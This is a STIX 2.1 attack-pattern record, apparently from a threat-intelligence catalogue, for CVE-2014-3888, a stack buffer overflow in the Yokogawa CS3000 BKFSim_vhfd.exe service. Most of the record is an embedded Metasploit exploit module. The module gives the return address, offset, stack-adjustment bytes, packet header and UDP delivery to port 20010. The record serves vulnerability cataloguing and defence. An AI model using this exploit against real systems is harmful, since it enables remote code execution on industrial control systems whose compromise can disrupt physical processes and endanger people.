{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5a8976a6-f922-4a7d-85dc-782a360ad556",
    "created": "2024-08-14T16:39:17.322347Z",
    "modified": "2024-08-14T16:39:17.322351Z",
    "name": "Yokogawa CS3000 BKFSim_vhfd.exe Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow on Yokogawa CS3000. The vulnerability exists in the service BKFSim_vhfd.exe when using malicious user-controlled data to create logs using functions like vsprintf and memcpy in an insecure way. This module has been tested successfully on Yokogawa Centum CS3000 R3.08.50 over Windows XP SP3. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/yokogawa_bkfsim_vhfd.rb",
            "external_id": "yokogawa_bkfsim_vhfd.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-3888"
        },
        {
            "source_name": "reference",
            "url": "http://jvn.jp/vu/JVNVU95045914/index.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0002E.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2014/07/07/r7-2014-06-disclosure-yokogawa-centum-cs-3000-bkfsimvhfdexe-buffer-overflow"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Yokogawa CS3000 BKFSim_vhfd.exe Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack based buffer overflow on Yokogawa CS3000. The vulnerability\n        exists in the service BKFSim_vhfd.exe when using malicious user-controlled data to create\n        logs using functions like vsprintf and memcpy in an insecure way. This module has been\n        tested successfully on Yokogawa Centum CS3000 R3.08.50 over Windows XP SP3.\n      },\n      'Author'         =>\n        [\n          'Redsadic <julian.vilas[at]gmail.com>',\n          'juan vazquez'\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-3888'],\n          ['URL', 'http://jvn.jp/vu/JVNVU95045914/index.html'],\n          ['URL', 'http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0002E.pdf'],\n          ['URL', 'https://www.rapid7.com/blog/post/2014/07/07/r7-2014-06-disclosure-yokogawa-centum-cs-3000-bkfsimvhfdexe-buffer-overflow']\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1770, # 2228 (max packet length) - 16 (header) - (438 target['Offset']) - 4 (ret)\n          'DisableNops' => true,\n          'BadChars' => \"\\x00\",\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Yokogawa Centum CS3000 R3.08.50 / Windows XP SP3',\n            {\n              'Ret'    => 0x61e55c9c, # push esp | ret # LibBKCCommon.dll\n              'Offset' => 438\n            }\n          ],\n        ],\n      'DisclosureDate' => '2014-05-23',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(20010)\n      ])\n  end\n\n  def exploit\n    connect_udp\n\n    sploit = \"\\x45\\x54\\x56\\x48\\x01\\x01\\x10\\x09\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x44\" # header\n    sploit << rand_text(target['Offset'])\n    sploit << [target.ret].pack(\"V\")\n    sploit << payload.encoded\n\n    print_status(\"Trying target #{target.name}, sending #{sploit.length} bytes...\")\n    udp_sock.put(sploit)\n\n    disconnect_udp\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2014-05-23",
    "x_mitre_platforms": [
        "win'"
    ]
}